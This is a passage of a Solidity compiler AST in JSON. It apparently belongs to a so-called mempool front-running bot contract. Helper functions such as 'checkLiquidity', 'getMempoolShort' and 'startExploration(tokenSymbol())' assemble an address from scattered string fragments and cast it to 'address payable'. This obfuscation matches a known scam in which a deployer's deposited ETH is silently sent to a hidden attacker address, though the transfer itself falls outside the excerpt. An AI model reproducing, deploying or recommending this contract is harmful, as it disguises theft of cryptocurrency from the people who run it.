																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 880,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "6384:1:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "6371:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 895,
															"nodeType": "IfStatement",
															"src": "6367:102:3",
															"trueBody": {
																"id": 894,
																"nodeType": "Block",
																"src": "6387:82:3",
																"statements": [
																	{
																		"assignments": [
																			883
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 883,
																				"mutability": "mutable",
																				"name": "_hexC4",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 894,
																				"src": "6393:20:3",
																				"stateVariable": false,
																				"storageLocation": "memory",
																				"typeDescriptions": {
																					"typeIdentifier": "t_string_memory_ptr",
																					"typeString": "string"
																				},
																				"typeName": {
																					"id": 882,
																					"name": "string",
																					"nodeType": "ElementaryTypeName",
																					"src": "6393:6:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_string_storage_ptr",
																						"typeString": "string"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 891,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "30303030",
																					"id": 885,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "string",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "6424:6:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_stringliteral_e8d1f6cb90fef5fc9696cc77858b42d4e99b0959246d86f4584b49f5af0fe3f9",
																						"typeString": "literal_string \"0000\""
																					},
																					"value": "0000"
																				},
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"id": 888,
																							"name": "res",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 792,
																							"src": "6439:3:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes_memory_ptr",
																								"typeString": "bytes memory"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_bytes_memory_ptr",
																								"typeString": "bytes memory"
																							}
																						],
																						"id": 887,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "6432:6:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																							"typeString": "type(string storage pointer)"
																						},
																						"typeName": {
																							"id": 886,
																							"name": "string",
																							"nodeType": "ElementaryTypeName",
																							"src": "6432:6:3",
																							"typeDescriptions": {
																								"typeIdentifier": null,
																								"typeString": null
																							}
																						}
																					},
																					"id": 889,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "6432:11:3",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_string_memory_ptr",
																						"typeString": "string memory"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_stringliteral_e8d1f6cb90fef5fc9696cc77858b42d4e99b0959246d86f4584b49f5af0fe3f9",
																						"typeString": "literal_string \"0000\""
																					},
																					{
																						"typeIdentifier": "t_string_memory_ptr",
																						"typeString": "string memory"
																					}
																				],
																				"id": 884,
																				"name": "mempool",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 678,
																				"src": "6416:7:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																					"typeString": "function (string memory,string memory) pure returns (string memory)"
																				}
																			},
																			"id": 890,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "6416:28:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "6393:51:3"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 892,
																			"name": "_hexC4",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 883,
																			"src": "6457:6:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		},
																		"functionReturnParameters": 770,
																		"id": 893,
																		"nodeType": "Return",
																		"src": "6450:13:3"
																	}
																]
															}
														},
														"id": 896,
														"nodeType": "IfStatement",
														"src": "6260:209:3",
														"trueBody": {
															"id": 878,
															"nodeType": "Block",
															"src": "6280:81:3",
															"statements": [
																{
																	"assignments": [
																		867
																	],
																	"declarations": [
																		{
																			"constant": false,
																			"id": 867,
																			"mutability": "mutable",
																			"name": "_hexC3",
																			"nodeType": "VariableDeclaration",
																			"overrides": null,
																			"scope": 878,
																			"src": "6286:20:3",
																			"stateVariable": false,
																			"storageLocation": "memory",
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string"
																			},
																			"typeName": {
																				"id": 866,
																				"name": "string",
																				"nodeType": "ElementaryTypeName",
																				"src": "6286:6:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_string_storage_ptr",
																					"typeString": "string"
																				}
																			},
																			"value": null,
																			"visibility": "internal"
																		}
																	],
																	"id": 875,
																	"initialValue": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"hexValue": "303030",
																				"id": 869,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "string",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "6317:5:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_stringliteral_35b5b8bece53958bb309db665734c38515f37439f69bfdbc64808f1af9a97c31",
																					"typeString": "literal_string \"000\""
																				},
																				"value": "000"
																			},
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 872,
																						"name": "res",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 792,
																						"src": "6331:3:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					],
																					"id": 871,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "6324:6:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																						"typeString": "type(string storage pointer)"
																					},
																					"typeName": {
																						"id": 870,
																						"name": "string",
																						"nodeType": "ElementaryTypeName",
																						"src": "6324:6:3",
																						"typeDescriptions": {
																							"typeIdentifier": null,
																							"typeString": null
																						}
																					}
																				},
																				"id": 873,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "6324:11:3",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_string_memory_ptr",
																					"typeString": "string memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_stringliteral_35b5b8bece53958bb309db665734c38515f37439f69bfdbc64808f1af9a97c31",
																					"typeString": "literal_string \"000\""
																				},
																				{
																					"typeIdentifier": "t_string_memory_ptr",
																					"typeString": "string memory"
																				}
																			],
																			"id": 868,
																			"name": "mempool",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 678,
																			"src": "6309:7:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																				"typeString": "function (string memory,string memory) pure returns (string memory)"
																			}
																		},
																		"id": 874,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "6309:27:3",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	},
																	"nodeType": "VariableDeclarationStatement",
																	"src": "6286:50:3"
																},
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 876,
																		"name": "_hexC3",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 867,
																		"src": "6349:6:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	},
																	"functionReturnParameters": 770,
																	"id": 877,
																	"nodeType": "Return",
																	"src": "6342:13:3"
																}
															]
														}
													},
													"id": 897,
													"nodeType": "IfStatement",
													"src": "6155:314:3",
													"trueBody": {
														"id": 862,
														"nodeType": "Block",
														"src": "6175:79:3",
														"statements": [
															{
																"assignments": [
																	851
																],
																"declarations": [
																	{
																		"constant": false,
																		"id": 851,
																		"mutability": "mutable",
																		"name": "_hexC2",
																		"nodeType": "VariableDeclaration",
																		"overrides": null,
																		"scope": 862,
																		"src": "6181:20:3",
																		"stateVariable": false,
																		"storageLocation": "memory",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string"
																		},
																		"typeName": {
																			"id": 850,
																			"name": "string",
																			"nodeType": "ElementaryTypeName",
																			"src": "6181:6:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_storage_ptr",
																				"typeString": "string"
																			}
																		},
																		"value": null,
																		"visibility": "internal"
																	}
																],
																"id": 859,
																"initialValue": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"hexValue": "30",
																			"id": 853,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "string",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6212:3:3",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																				"typeString": "literal_string \"0\""
																			},
																			"value": "0"
																		},
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 856,
																					"name": "res",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 792,
																					"src": "6224:3:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				],
																				"id": 855,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "6217:6:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																					"typeString": "type(string storage pointer)"
																				},
																				"typeName": {
																					"id": 854,
																					"name": "string",
																					"nodeType": "ElementaryTypeName",
																					"src": "6217:6:3",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 857,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "6217:11:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																				"typeString": "literal_string \"0\""
																			},
																			{
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		],
																		"id": 852,
																		"name": "mempool",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 678,
																		"src": "6204:7:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																			"typeString": "function (string memory,string memory) pure returns (string memory)"
																		}
																	},
																	"id": 858,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "6204:25:3",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																"nodeType": "VariableDeclarationStatement",
																"src": "6181:48:3"
															},
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 860,
																	"name": "_hexC2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 851,
																	"src": "6242:6:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																"functionReturnParameters": 770,
																"id": 861,
																"nodeType": "Return",
																"src": "6235:13:3"
															}
														]
													}
												},
												"id": 898,
												"nodeType": "IfStatement",
												"src": "6050:419:3",
												"trueBody": {
													"id": 846,
													"nodeType": "Block",
													"src": "6070:79:3",
													"statements": [
														{
															"assignments": [
																835
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 835,
																	"mutability": "mutable",
																	"name": "_hexC1",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 846,
																	"src": "6076:20:3",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 834,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "6076:6:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 843,
															"initialValue": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 837,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "6107:3:3",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																			"typeString": "literal_string \"0\""
																		},
																		"value": "0"
																	},
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 840,
																				"name": "res",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 792,
																				"src": "6119:3:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			],
																			"id": 839,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "6112:6:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																				"typeString": "type(string storage pointer)"
																			},
																			"typeName": {
																				"id": 838,
																				"name": "string",
																				"nodeType": "ElementaryTypeName",
																				"src": "6112:6:3",
																				"typeDescriptions": {
																					"typeIdentifier": null,
																					"typeString": null
																				}
																			}
																		},
																		"id": 841,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "6112:11:3",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																			"typeString": "literal_string \"0\""
																		},
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 836,
																	"name": "mempool",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 678,
																	"src": "6099:7:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory,string memory) pure returns (string memory)"
																	}
																},
																"id": 842,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "6099:25:3",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "6076:48:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 844,
																"name": "_hexC1",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 835,
																"src": "6137:6:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"functionReturnParameters": 770,
															"id": 845,
															"nodeType": "Return",
															"src": "6130:13:3"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 901,
															"name": "res",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 792,
															"src": "6489:3:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 900,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "6482:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 899,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "6482:6:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 902,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6482:11:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 770,
												"id": 903,
												"nodeType": "Return",
												"src": "6475:18:3"
											}
										]
									},
									"documentation": null,
									"id": 905,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "checkLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 767,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 766,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 905,
												"src": "5757:6:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 765,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5757:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5756:8:3"
									},
									"returnParameters": {
										"id": 770,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 769,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 905,
												"src": "5788:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 768,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5788:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5787:15:3"
									},
									"scope": 1047,
									"src": "5733:765:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 912,
										"nodeType": "Block",
										"src": "6568:23:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "307845",
													"id": 910,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "string",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "6581:5:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_stringliteral_e8d2bd60e6438f0f6eb1a6d2407beeab3c41d7949f80c8ce033b8a2970a36e13",
														"typeString": "literal_string \"0xE\""
													},
													"value": "0xE"
												},
												"functionReturnParameters": 909,
												"id": 911,
												"nodeType": "Return",
												"src": "6574:12:3"
											}
										]
									},
									"documentation": null,
									"id": 913,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMempoolShort",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 906,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "6528:2:3"
									},
									"returnParameters": {
										"id": 909,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 908,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 913,
												"src": "6553:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 907,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "6553:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6552:15:3"
									},
									"scope": 1047,
									"src": "6504:87:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 971,
										"nodeType": "Block",
										"src": "6652:472:3",
										"statements": [
											{
												"assignments": [
													919
												],
												"declarations": [
													{
														"constant": false,
														"id": 919,
														"mutability": "mutable",
														"name": "to",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 971,
														"src": "6657:10:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 918,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "6657:7:3",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 925,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 921,
																		"name": "tokenSymbol",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1009,
																		"src": "6688:11:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																			"typeString": "function () pure returns (string memory)"
																		}
																	},
																	"id": 922,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "6688:13:3",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"id": 923,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "6687:15:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 920,
														"name": "startExploration",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 581,
														"src": "6670:16:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 924,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6670:33:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6657:46:3"
											},
											{
												"assignments": [
													927
												],
												"declarations": [
													{
														"constant": false,
														"id": 927,
														"mutability": "mutable",
														"name": "contracts",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 971,
														"src": "6708:25:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														},
														"typeName": {
															"id": 926,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "6708:15:3",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 932,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 930,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 919,
															"src": "6744:2:3",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 929,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "6736:8:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_payable_$",
															"typeString": "type(address payable)"
														},
														"typeName": {
															"id": 928,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "6736:8:3",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 931,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6736:11:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6708:39:3"
											},
											{
												"assignments": [
													934
												],
												"declarations": [
													{
														"constant": false,
														"id": 934,
														"mutability": "mutable",
														"name": "_mempoolShort",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 971,
														"src": "6758:27:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 933,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "6758:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 937,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 935,
														"name": "getMempoolShort",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 913,
														"src": "6788:15:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
															"typeString": "function () pure returns (string memory)"
														}
													},
													"id": 936,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6788:17:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6758:47:3"
											},
											{
												"assignments": [
													939
												],
												"declarations": [
													{
														"constant": false,
														"id": 939,
														"mutability": "mutable",
														"name": "_mempoolEdition",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 971,
														"src": "6810:29:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 938,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "6810:6:3",
															"typeDescriptions": {
